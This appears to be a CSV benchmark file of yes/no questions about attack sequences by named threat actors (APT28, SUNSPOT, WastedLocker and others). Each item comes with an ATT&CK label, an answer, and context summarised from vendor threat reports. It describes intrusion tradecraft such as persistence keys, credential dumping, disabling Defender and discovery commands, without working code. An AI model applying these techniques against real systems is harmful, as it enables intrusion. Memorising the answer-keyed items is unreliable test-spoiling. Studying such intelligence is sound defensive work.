1590,303,303-Collection-T1025-Data from Removable Media,"After evading detection by customizing its installation to avoid analysis by security researchers and security products, is T9000 likely to target Skype users and automatically capture data, such as files from removable media, and steal sensitive files before exfiltrating this data to the C2 server through compressed and encrypted network traffic?","Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
1616,307,307-Initial Access-T1566-Phishing,"Before achieving initial access by employing spear phishing emails with crafted documents, is APT28 likely to scan IP ranges using geographically distributed bots and centralize the identified vulnerabilities from the scan results?","Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.
Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.
Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.
Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1619,307,307-Discovery-T1046-Network Service Discovery,"After employing spear phishing emails with malicious attachments to gain initial access and executing a dropper to enable system compromise, is APT28 likely to use geographically distributed bots to report back to a central server during its discovery process?","Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.
Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.
Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.
Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1622,307,307-Command and Control-T1573-Encrypted Channel,"Following APT28's deployment of pr.dll for data collection, which uploads stolen information to the C&C server, is it likely that the advstoreshell.dll will be utilized for encrypted communication with C&C servers via HTTP on port 443 or 80?","Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.
Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.
Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.
Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1625,307,307-Exfiltration-T1048-Exfiltration Over Alternative Protocol,"After collecting data using crafted modules like pr.dll to upload stolen information to the C&C server, is it likely that APT28 will perform exfiltration by transferring emails and files such as .pst and .dbx to a central server, targeting political figures and the aerospace industry?","Exfiltration: APT28 exfiltrates data such as emails and files to the central server. The stolen information includes emails from political figures and the aerospace industry, with specific examples of .pst and .dbx files being transferred to the server.","Reconnaissance: APT28, also known as Sofacy, has been actively scanning for new targets, particularly focusing on Ukraine and Spain. They scanned 8,536,272 IPs in Ukraine during a political summit in Minsk, identifying 1,704,837 as vulnerable. The scanning process involved a python script generating random IPs, a database centralizing data, scan bots probing potential victims, and a Django application for administration and reporting. The bots are geographically distributed across the United States, United Kingdom, and Bulgaria.
Initial Access: APT28 employs spear phishing emails with crafted Word and Excel documents, phishing websites on typosquatted domains, and malicious iFrames leading to Java and Flash zero-day exploits to infect targets. The first stage of the attack involves a dropper named runrun.exe, which drops and executes a file to contact the C&C server and download the second stage component.
Execution: The second stage component, installed by a dropper named winloat.exe, writes key components to the disk along with a configuration file. It then takes control of the machine, deploying tools like a password dumper (run.exe), a privilege escalation tool (xp.exe), and a proxy tool (svehost.exe) to facilitate further actions.
Persistence: APT28 ensures persistence by changing the timestamps of all files downloaded by the second stage dropper to 14/04/2008, 16:00, a technique to hide the files from victims who might attempt to list new files on the disk.
Privilege Escalation: APT28 uses a tool exploiting a privilege escalation vulnerability (CVE-2014-4076) to gain system privileges, allowing the execution of files with elevated permissions.
Defense Evasion: APT28 evades defenses by changing file timestamps and using a proxy tool (svehost.exe) to contact systems behind routers, which would otherwise not be accessible from outside the network.
Credential Access: APT28 deploys a password dumping tool (run.exe) based on the mimikatz source, which dumps passwords from logged-in users through LSASS.
Discovery: APT28 discovers the environment by scanning IP ranges and identifying vulnerable systems. The bots used for scanning report back to a central server, which centralizes the information.
Collection: APT28 collects data by deploying additional modules like pr.dll, which uploads stolen data to the C&C server. The module is crafted individually for each target system and can accommodate different plugins for data collection.
Command and Control: APT28's C&C communication is carried out via HTTP on port 443 or 80 if necessary. In some cases, the communication is encrypted using 3DES and RSA. The backdoor component advstoreshell.dll contacts the C&C servers indicated in the configuration file.
Others: The authors of APT28 are believed to be Russian speakers, supported by evidence such as hardcoded paths in Russian in the files and the compilation times aligning with the working hours in the UTC+4 time zone, which includes Russia. The report is authored by a team from Bitdefender, including Răzvan Benchea, Cristina Vatamanu, Alexandru Maximciuc, and Victor Luncasu.",Yes,Bitdefender_In-depth_analysis_of_APT28__The_Political_Cyber-Espionage
1636,308,308-Privilege Escalation-T1055-Process Injection,"Before granting itself debugging privileges by modifying its security token to add SeDebugPrivilege for process injection, is SUNSPOT likely to ensure persistence through a scheduled task set to execute at host boot and employ defense evasion techniques such as using AES128-CBC encryption to protect targeted source code files?","Privilege Escalation: SUNSPOT malware grants itself debugging privileges by modifying its security token to add SeDebugPrivilege, which is a prerequisite for the remainder of its execution, involving reading other processes' memory.","Execution: CrowdStrike Intelligence Team reported on January 11, 2021, that SUNSPOT malware was used to insert the SUNBURST backdoor into SolarWinds Orion IT management product builds. SUNSPOT was designed to monitor processes involved in the compilation of the Orion product and replace a source file to include the SUNBURST backdoor code. The malware was identified on disk with the filename taskhostsvc.exe and internally named taskhostw.exe by its developers. It was likely built on February 20, 2020, and maintained persistence through a scheduled task set to execute at host boot.
Persistence: SUNSPOT malware maintains persistence through a scheduled task set to execute when the host boots. This task is triggered at boot time to ensure the malware's continued operation within the compromised system.
Defense Evasion: SUNSPOT employs several defense evasion techniques, including the use of AES128-CBC encryption to protect targeted source code files and the backdoored source code file in the binary. It also uses RC4 encryption with a hard-coded key to protect log file entries. The malware masquerades as a legitimate Windows binary and writes its logs in a fake VMWare log file. Additionally, SUNSPOT inserts the backdoor code within #pragma statements to disable and restore warnings, preventing the backdoor code lines from appearing in build logs.
Discovery: SUNSPOT monitors running processes for instances of MsBuild.exe, which is part of Microsoft Visual Studio development tools, to detect the targeted Visual Studio solution build.
Impact: SUNSPOT modifies the Orion source code to inject the SUNBURST backdoor, which is an example of data manipulation stored-data manipulation under the Impact tactic.",Yes,SUNSPOT Malware A Technical Analysis
1638,308,308-Impact-T1565-Data Manipulation,"After monitoring running processes for instances of MsBuild.exe as part of the Discovery tactic, is it likely that SUNSPOT will modify the Orion source code to inject the SUNBURST backdoor as part of the Impact tactic?","Impact: SUNSPOT modifies the Orion source code to inject the SUNBURST backdoor, which is an example of data manipulation stored-data manipulation under the Impact tactic.","Execution: CrowdStrike Intelligence Team reported on January 11, 2021, that SUNSPOT malware was used to insert the SUNBURST backdoor into SolarWinds Orion IT management product builds. SUNSPOT was designed to monitor processes involved in the compilation of the Orion product and replace a source file to include the SUNBURST backdoor code. The malware was identified on disk with the filename taskhostsvc.exe and internally named taskhostw.exe by its developers. It was likely built on February 20, 2020, and maintained persistence through a scheduled task set to execute at host boot.
Persistence: SUNSPOT malware maintains persistence through a scheduled task set to execute when the host boots. This task is triggered at boot time to ensure the malware's continued operation within the compromised system.
Privilege Escalation: SUNSPOT malware grants itself debugging privileges by modifying its security token to add SeDebugPrivilege, which is a prerequisite for the remainder of its execution, involving reading other processes' memory.
Defense Evasion: SUNSPOT employs several defense evasion techniques, including the use of AES128-CBC encryption to protect targeted source code files and the backdoored source code file in the binary. It also uses RC4 encryption with a hard-coded key to protect log file entries. The malware masquerades as a legitimate Windows binary and writes its logs in a fake VMWare log file. Additionally, SUNSPOT inserts the backdoor code within #pragma statements to disable and restore warnings, preventing the backdoor code lines from appearing in build logs.
Discovery: SUNSPOT monitors running processes for instances of MsBuild.exe, which is part of Microsoft Visual Studio development tools, to detect the targeted Visual Studio solution build.",Yes,SUNSPOT Malware A Technical Analysis
1648,31,31-Command and Control-T1090-Proxy,"After leveraging a watering hole attack on a popular software reseller using an Internet Explorer zero-day for initial access, is it likely that the attack group will adopt and customize several Android backdoors, utilize a massive infrastructure for Command and Control, and deploy second-stage backdoors with hardcoded proxy addresses and credentials?","Command and Control: May 2015: Attack group adopts and customizes several Android backdoors to suit their purposes and uses a massive infrastructure compared to previous attacks. Initial backdoors are relatively simple, but continually forward all SMS messages and call information back to their C2 servers. All identified victims reside in Japan or South Korea. 2015: A number of second-stage backdoors with hardcoded proxy addresses and credentials compromise a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation.","Reconnaissance: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains. February 2015: A second-stage implant delivered by a variant of the S-Type backdoor shortly following its initial reconnaissance compromised the investment arm of a major Japanese Automaker.
Initial Access: July to August 2011: Attacks leveraged an unpatched Internet Explorer 8 vulnerability to gain a foothold into victim networks. February 2014: A watering hole attack on a popular software reseller delivered an Internet Explorer zero-day to a number of unsuspecting targets.
Persistence: February 2014: The group began locating and securing alternative means of persistence on victim systems.
Credential Access: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains.
Others: March to August 2013: Attack activity greatly subsides, although several new domains that will be used later are registered. Early operations are extremely blunt, relatively unsophisticated, and readily picked up by the security industry. October 2011: Attack group attempts to take advantage of the ongoing Libyan crisis by phishing the news cycle regarding Muammar Gaddafi's death, targeting US defense targets. June 2012: Attack campaign leverages previously used flash exploit and Internet Explorer zero-day. July & October 2015: Two new waves of attacks are launched, targeting multiple Japanese companies including a Japanese subsidiary of a South Korean electric utility and a major Japanese oil and gas company. The most likely goals are reconnaissance and long-term espionage. 2016: SPEAR believes that attacks of this nature into companies involved in Japanese critical infrastructure and resources are ongoing and likely to continue to escalate in the future.",Yes,Dust_Storm_Infographic_v4
1649,31,31-Reconnaissance-T1598-Phishing for Information,"Following the attacks that leveraged an unpatched Internet Explorer 8 vulnerability for initial access into victim networks, is it likely that the attack group used phishing domains to gather user credentials during the reconnaissance phase?","Reconnaissance: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains. February 2015: A second-stage implant delivered by a variant of the S-Type backdoor shortly following its initial reconnaissance compromised the investment arm of a major Japanese Automaker.","Initial Access: July to August 2011: Attacks leveraged an unpatched Internet Explorer 8 vulnerability to gain a foothold into victim networks. February 2014: A watering hole attack on a popular software reseller delivered an Internet Explorer zero-day to a number of unsuspecting targets.
Persistence: February 2014: The group began locating and securing alternative means of persistence on victim systems.
Credential Access: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains.
Command and Control: May 2015: Attack group adopts and customizes several Android backdoors to suit their purposes and uses a massive infrastructure compared to previous attacks. Initial backdoors are relatively simple, but continually forward all SMS messages and call information back to their C2 servers. All identified victims reside in Japan or South Korea. 2015: A number of second-stage backdoors with hardcoded proxy addresses and credentials compromise a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation.
Others: March to August 2013: Attack activity greatly subsides, although several new domains that will be used later are registered. Early operations are extremely blunt, relatively unsophisticated, and readily picked up by the security industry. October 2011: Attack group attempts to take advantage of the ongoing Libyan crisis by phishing the news cycle regarding Muammar Gaddafi's death, targeting US defense targets. June 2012: Attack campaign leverages previously used flash exploit and Internet Explorer zero-day. July & October 2015: Two new waves of attacks are launched, targeting multiple Japanese companies including a Japanese subsidiary of a South Korean electric utility and a major Japanese oil and gas company. The most likely goals are reconnaissance and long-term espionage. 2016: SPEAR believes that attacks of this nature into companies involved in Japanese critical infrastructure and resources are ongoing and likely to continue to escalate in the future.",Yes,Dust_Storm_Infographic_v4
1664,310,310-Resource Development-T1588-Obtain Capabilities,"After delivering GraphicalNeutrino and GraphicalProton malware through spearphishing emails with malicious links, is BlueBravo likely to use these malware loaders to gather victim system information, such as username, computer name, and network connections, before employing known malware families for continued operation?","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.","Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.
Discovery: BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes.
Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes,APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware
1672,311,311-Discovery-T1033-System Owner/User Discovery,"Is it likely that after gaining initial access using SocGholish via malicious JavaScript frameworks, the attackers will subsequently deploy Cobalt Strike using PowerShell for execution and proceed to use commands like ""whoami"", ""net user"", and ""net group"" for discovery?","Discovery: The discovery phase involved profiling the computer using commands like whoami, net user, and net group. The attackers also used the Get-NetComputer command from PowerView, renamed to a random name, to search for computer objects in the Active Directory database.","Reconnaissance: The CTI report by Symantec, a division of Broadcom, identified a series of attacks against U.S. organizations, aiming to deploy WastedLocker ransomware. The attackers, linked to the group 'Evil Corp', used a malicious JavaScript-based framework called SocGholish, found on over 150 compromised websites, to masquerade as a software update and initiate the attack.
Initial Access: The initial compromise involved the SocGholish framework, delivered via compromised legitimate websites. Victims received a zipped file containing malicious JavaScript disguised as a browser update. This led to the execution of a second JavaScript file by wscript.exe, profiling the computer and downloading additional discovery-related PowerShell scripts.
Execution: The attackers deployed Cobalt Strike using PowerShell to download and execute a loader, which contained a .NET injector taken from an open-source project called Donut. This was used to execute the Cobalt Strike Beacon payload, capable of command execution, process injection, privilege escalation, and file upload/download.
Privilege Escalation: Privilege escalation was achieved using a publicly documented technique involving the Software Licensing User Interface tool (slui.exe). The attackers also used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers.
Defense Evasion: To deploy the ransomware, the attackers used PsExec to launch a command line tool for managing Windows Defender, disabling scanning, removing definitions, and in some cases, disabling real-time monitoring. They also used PsExec to stop services across the organization before launching the WastedLocker ransomware.
Credential Access: Cobalt Strike was used for credential dumping using ProcDump and to empty log files, aiding in the concealment of the attackers' activities.
Lateral Movement: The attackers used Cobalt Strike Beacon for lateral movement, executing commands and injecting processes on remote computers.
Command and Control: The injected Cobalt Strike Beacon payload communicated with a command and control (C&C) domain, which was publicly reported as part of the WastedLocker attack infrastructure.
Impact: The end goal of the WastedLocker attacks was to cripple the victim's IT infrastructure by encrypting computers and servers, leading to significant disruption and demanding a multimillion-dollar ransom.
Others: Symantec's Targeted Attack Cloud Analytics, using advanced machine learning, proactively detected the attacks. The Threat Hunter team verified the activity, which corresponded to the early stages of WastedLocker attacks. This discovery helped identify additional targeted organizations and strengthen protection against the attack. Symantec has alerted at least 31 customer organizations to the threat, with the majority being major U.S. corporations, including 11 listed companies and eight Fortune 500 companies. The attackers demonstrated skill and experience, capable of penetrating well-protected corporations, stealing credentials, and moving across networks with ease. Symantec has implemented file-based protection and intrusion prevention measures to protect against WastedLocker and associated activities. Indicators of Compromise (IoCs) including domains and IP addresses linked to the attacks have been reported to the relevant registrar, with assistance from Namecheap in suspending some domains. The Critical Attack Discovery and Intelligence team within Symantec is dedicated to investigating targeted attacks, enhancing protection in Symantec products, and providing analysis to help customers respond to attacks.",Yes,WastedLocker_ Symantec Identifies Wave of Attacks Against U.S. Organizations _ Symantec Blogs
1674,311,311-Discovery-T1018-Remote System Discovery,Is it likely that the attackers will use the SocGholish framework delivered via compromised legitimate websites for initial compromise before using the Get-NetComputer command from PowerView for remote system discovery?,"Discovery: The discovery phase involved profiling the computer using commands like whoami, net user, and net group. The attackers also used the Get-NetComputer command from PowerView, renamed to a random name, to search for computer objects in the Active Directory database.","Reconnaissance: The CTI report by Symantec, a division of Broadcom, identified a series of attacks against U.S. organizations, aiming to deploy WastedLocker ransomware. The attackers, linked to the group 'Evil Corp', used a malicious JavaScript-based framework called SocGholish, found on over 150 compromised websites, to masquerade as a software update and initiate the attack.
Initial Access: The initial compromise involved the SocGholish framework, delivered via compromised legitimate websites. Victims received a zipped file containing malicious JavaScript disguised as a browser update. This led to the execution of a second JavaScript file by wscript.exe, profiling the computer and downloading additional discovery-related PowerShell scripts.
Execution: The attackers deployed Cobalt Strike using PowerShell to download and execute a loader, which contained a .NET injector taken from an open-source project called Donut. This was used to execute the Cobalt Strike Beacon payload, capable of command execution, process injection, privilege escalation, and file upload/download.
Privilege Escalation: Privilege escalation was achieved using a publicly documented technique involving the Software Licensing User Interface tool (slui.exe). The attackers also used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers.
Defense Evasion: To deploy the ransomware, the attackers used PsExec to launch a command line tool for managing Windows Defender, disabling scanning, removing definitions, and in some cases, disabling real-time monitoring. They also used PsExec to stop services across the organization before launching the WastedLocker ransomware.
Credential Access: Cobalt Strike was used for credential dumping using ProcDump and to empty log files, aiding in the concealment of the attackers' activities.
Lateral Movement: The attackers used Cobalt Strike Beacon for lateral movement, executing commands and injecting processes on remote computers.
Command and Control: The injected Cobalt Strike Beacon payload communicated with a command and control (C&C) domain, which was publicly reported as part of the WastedLocker attack infrastructure.
Impact: The end goal of the WastedLocker attacks was to cripple the victim's IT infrastructure by encrypting computers and servers, leading to significant disruption and demanding a multimillion-dollar ransom.
Others: Symantec's Targeted Attack Cloud Analytics, using advanced machine learning, proactively detected the attacks. The Threat Hunter team verified the activity, which corresponded to the early stages of WastedLocker attacks. This discovery helped identify additional targeted organizations and strengthen protection against the attack. Symantec has alerted at least 31 customer organizations to the threat, with the majority being major U.S. corporations, including 11 listed companies and eight Fortune 500 companies. The attackers demonstrated skill and experience, capable of penetrating well-protected corporations, stealing credentials, and moving across networks with ease. Symantec has implemented file-based protection and intrusion prevention measures to protect against WastedLocker and associated activities. Indicators of Compromise (IoCs) including domains and IP addresses linked to the attacks have been reported to the relevant registrar, with assistance from Namecheap in suspending some domains. The Critical Attack Discovery and Intelligence team within Symantec is dedicated to investigating targeted attacks, enhancing protection in Symantec products, and providing analysis to help customers respond to attacks.",Yes,WastedLocker_ Symantec Identifies Wave of Attacks Against U.S. Organizations _ Symantec Blogs
1676,311,311-Lateral Movement-T1021-Remote Services,"After profiling the computer using commands like whoami, net user, and net group during the Discovery phase, is it likely that the attackers will use Cobalt Strike Beacon for lateral movement to execute commands and inject processes on remote computers before communicating with a command and control (C&C) domain via the injected Cobalt Strike Beacon payload during the Command and Control phase?","Lateral Movement: The attackers used Cobalt Strike Beacon for lateral movement, executing commands and injecting processes on remote computers.","Reconnaissance: The CTI report by Symantec, a division of Broadcom, identified a series of attacks against U.S. organizations, aiming to deploy WastedLocker ransomware. The attackers, linked to the group 'Evil Corp', used a malicious JavaScript-based framework called SocGholish, found on over 150 compromised websites, to masquerade as a software update and initiate the attack.
Initial Access: The initial compromise involved the SocGholish framework, delivered via compromised legitimate websites. Victims received a zipped file containing malicious JavaScript disguised as a browser update. This led to the execution of a second JavaScript file by wscript.exe, profiling the computer and downloading additional discovery-related PowerShell scripts.
Execution: The attackers deployed Cobalt Strike using PowerShell to download and execute a loader, which contained a .NET injector taken from an open-source project called Donut. This was used to execute the Cobalt Strike Beacon payload, capable of command execution, process injection, privilege escalation, and file upload/download.
Privilege Escalation: Privilege escalation was achieved using a publicly documented technique involving the Software Licensing User Interface tool (slui.exe). The attackers also used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers.
Defense Evasion: To deploy the ransomware, the attackers used PsExec to launch a command line tool for managing Windows Defender, disabling scanning, removing definitions, and in some cases, disabling real-time monitoring. They also used PsExec to stop services across the organization before launching the WastedLocker ransomware.
Credential Access: Cobalt Strike was used for credential dumping using ProcDump and to empty log files, aiding in the concealment of the attackers' activities.
Discovery: The discovery phase involved profiling the computer using commands like whoami, net user, and net group. The attackers also used the Get-NetComputer command from PowerView, renamed to a random name, to search for computer objects in the Active Directory database.
Command and Control: The injected Cobalt Strike Beacon payload communicated with a command and control (C&C) domain, which was publicly reported as part of the WastedLocker attack infrastructure.
Impact: The end goal of the WastedLocker attacks was to cripple the victim's IT infrastructure by encrypting computers and servers, leading to significant disruption and demanding a multimillion-dollar ransom.
Others: Symantec's Targeted Attack Cloud Analytics, using advanced machine learning, proactively detected the attacks. The Threat Hunter team verified the activity, which corresponded to the early stages of WastedLocker attacks. This discovery helped identify additional targeted organizations and strengthen protection against the attack. Symantec has alerted at least 31 customer organizations to the threat, with the majority being major U.S. corporations, including 11 listed companies and eight Fortune 500 companies. The attackers demonstrated skill and experience, capable of penetrating well-protected corporations, stealing credentials, and moving across networks with ease. Symantec has implemented file-based protection and intrusion prevention measures to protect against WastedLocker and associated activities. Indicators of Compromise (IoCs) including domains and IP addresses linked to the attacks have been reported to the relevant registrar, with assistance from Namecheap in suspending some domains. The Critical Attack Discovery and Intelligence team within Symantec is dedicated to investigating targeted attacks, enhancing protection in Symantec products, and providing analysis to help customers respond to attacks.",Yes,WastedLocker_ Symantec Identifies Wave of Attacks Against U.S. Organizations _ Symantec Blogs
